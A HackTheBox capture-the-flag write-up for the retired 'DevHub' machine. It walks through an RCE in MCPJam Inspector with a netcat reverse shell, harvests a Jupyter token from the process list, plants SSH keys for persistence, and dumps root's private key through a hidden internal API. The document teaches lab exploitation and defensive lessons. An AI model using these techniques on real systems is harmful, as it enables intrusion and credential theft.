# DevHub

```
Platform    : HackTheBox
OS          : Linux
Difficulty  : Hard
Category    : MCP / Known CVE / SSH Pivoting / Hidden API Endpoints
IP          : 10.129.245.216
```

---

## Summary

The target hosted an internal developer platform exposing three
services: an MCP (Model Context Protocol) Inspector tool, a
Jupyter-based analytics dashboard, and an internal Git server. A known
RCE in MCPJam Inspector v1.4.2 provided an initial foothold as
`mcp-dev`. From there, a leaked Jupyter authentication token — visible
in plaintext in the process list — was used to reach a Jupyter
session running as a second user, `analyst`, whose built-in terminal
feature provided a direct shell as that user with no exploit needed.
Local enumeration as `analyst` uncovered an internal Flask API with
undocumented "hidden" tool endpoints, one of which dumped root's SSH
private key on request, completing the chain to full root access.

---

## Reconnaissance

```
nmap -p- -sS --min-rate 5000 -vvv -n -Pn --open 10.129.245.216 -oN scan.txt
nmap -p 22,80 -sCV 10.129.245.216
```

Key findings:

- **Port 22** — OpenSSH 8.9p1 (Ubuntu)
- **Port 80** — nginx 1.18.0, redirecting to `devhub.htb`

The landing page itself mapped out the internal attack surface
directly, describing three internal tools and their access
constraints:

![DevHub landing page listing MCP Inspector, Analytics Dashboard, and Code Repository](./images/devhub/devhub-landing.png)

```
MCP Inspector    — Active, Port 6274
Analytics Dashboard — Jupyter, Internal Only, localhost:8888, analyst-only
Code Repository  — Maintenance Mode
```

A follow-up scan on the referenced port confirmed a web service:

```
nmap -p 6274 -sCV 10.129.245.216
```

```
<title>MCPJam Inspector</title>
```

---

## Enumeration

The MCPJam Inspector UI was reachable directly:

![MCPJam Inspector — Servers page](./images/devhub/mcpjam-inspector.png)

Its Settings page confirmed the exact running version:

![MCPJam Settings page confirming version v1.4.2](./images/devhub/mcpjam-version.png)

```
MCPJam Version: v1.4.2
```

MCPJam Inspector 1.4.2 is affected by a known RCE via its
`/api/mcp/connect` endpoint (documented in detail in
[this write-up](https://medium.com/@iamkumarraj/exploiting-mcpjam-inspector-understanding-rce-via-api-mcp-connect-2f2791166d2a),
which also links a working exploit). The public exploit was used
directly against the target.

---

## Foothold

```
python3 exploit.py
```

```
[+] Payload sent! Check your nc listener
```

Caught on a listener:

```
nc -lvnp 4444
```

```
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ whoami
mcp-dev
```

---

## Lateral Movement — mcp-dev to analyst

With an initial shell, `ss` and `ps` were used to enumerate local
services and running processes:

```
ss -nltp
```

```
127.0.0.1:5000   <- internal Flask service
127.0.0.1:8888   <- Jupyter (matches the landing page's hint)
0.0.0.0:6274     <- MCPJam (already exploited)
```

The process list revealed something more directly useful: Jupyter's
authentication token, passed as a plaintext command-line argument at
service startup:

```
ps auxww | grep jupyter
```

```
analyst  /home/analyst/jupyter-env/bin/python3 .../jupyter-lab
  --ip=127.0.0.1 --port=8888 --no-browser
  --notebook-dir=/home/analyst/notebooks
  --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

Critically, this process runs as **`analyst`**, not `mcp-dev` — meaning
Jupyter itself is a different user context worth reaching. Since
Jupyter was bound to `127.0.0.1:8888`, an SSH local port-forward was
needed. A dedicated keypair was generated and self-authorized to make
this persistent:

```bash
# on the target, as mcp-dev
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "ssh-ed25519 AAAA...SSH to PIVOT" > ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

```bash
# attacker
ssh-keygen -t ed25519 -f pivot_key -C "SSH to PIVOT" -N ""
ssh -L 8888:localhost:8888 -i pivot_key mcp-dev@devhub.htb
```

With the tunnel established, the leaked token unlocked the Jupyter
login page at `localhost:8888`:

![Jupyter login page requesting a password or token](./images/devhub/jupyter-login.png)

Since JupyterLab **runs as `analyst`**, its built-in terminal feature
(not a vulnerability — a standard JupyterLab capability) opens a shell
directly as that user, with no further exploitation required:

![JupyterLab terminal opened as analyst@devhub](./images/devhub/jupyter-terminal-analyst.png)

From that terminal, the exact same self-authorization technique used
earlier as `mcp-dev` was repeated to get persistent SSH access as
`analyst`:

```bash
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "ssh-ed25519 AAAA...SSH to PIVOT" > ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

![Terminal commands planting the pivot key in analyst's authorized_keys](./images/devhub/jupyter-terminal-authkeys.png)

```
ssh -i pivot_key analyst@devhub.htb
```

```
analyst@devhub:~$ whoami
analyst
```

---

## Privilege Escalation

The internal Flask service on port 5000 (seen earlier in `ss`) was
readable directly as `analyst`:

```
cat /opt/opsmcp/server.py
```

The source revealed a small internal "ops" API requiring an
`X-API-Key` header, exposing a set of **visible** tools
(`ops.system_status`, `ops.list_services`, etc.) — but also a second,
undocumented dictionary of **hidden tools**, not listed by
`/tools/list` but still fully callable through `/tools/call`:

```python
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {...}
}
```

`ops._admin_dump` explicitly supports dumping `ssh_keys`, including
**root's private key**, directly from disk:

```python
if target == "ssh_keys":
    with open('/root/.ssh/id_rsa', 'r') as f:
        key_data = f.read()
    return jsonify({"root_private_key": key_data, ...})
```

The valid API key was hardcoded in the same file
(`opsmcp_secret_key_4f5a6b7c8d9e0f1a`). Calling the hidden endpoint
directly:

```bash
curl -X POST http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": "True"}}'
```

```json
{"root_private_key": "-----BEGIN OPENSSH PRIVATE KEY-----\n...", "target": "ssh_keys"}
```

The key was reassembled locally and used directly:

```bash
echo -e "-----BEGIN OPENSSH PRIVATE KEY-----\n...\n-----END OPENSSH PRIVATE KEY-----" > root-key.txt
chmod 600 root-key.txt
ssh -i root-key.txt root@devhub.htb
```

```
root@devhub:~# whoami
root
```

---

## Lessons Learned

- A "helpful" landing page describing internal tools and their access
  restrictions is effectively a recon shortcut handed to you — treat
  any such description as a literal target list, not just marketing
  copy.
- Process listings (`ps auxww`) are worth checking on every new
  foothold specifically for secrets passed as command-line arguments
  — authentication tokens, passwords, and API keys end up there far
  more often than expected, and they're visible to any local user by
  design.
- Not every user pivot requires an exploit: legitimate features of a
  tool (here, JupyterLab's built-in terminal) can grant a full shell
  as whatever user is running that tool, if you can reach the service
  and authenticate to it.
- Code with an obvious "visible" and "hidden" split (like this API's
  `VISIBLE_TOOLS` / `HIDDEN_TOOLS`) is a strong signal that hidden
  functionality is reachable even without being advertised — always
  worth reading full source rather than trusting a service's own
  documented endpoint list.
- Internal APIs "protected" by a hardcoded API key checked in source
  aren't protected at all once that source is readable — any
  filesystem read access downstream of a foothold should include
  checking internal service code for exactly this pattern.

---

<sub>Write-up published after machine retirement, per HackTheBox disclosure policy.</sub>
